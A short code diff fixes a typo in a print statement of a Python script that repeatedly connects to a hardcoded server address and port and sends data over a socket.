@@ -15,7 +15,7 @@ while True:
 		dest.settimeout(5)
 		print("[*] Connecting to Server")
 		dest.connect(("25.92.19.65", 3333))
-		print("[*] Sendin g data to Server")
+		print("[*] Sending data to Server")
 		dest.sendall(data)
 		dest.close()
 	except:
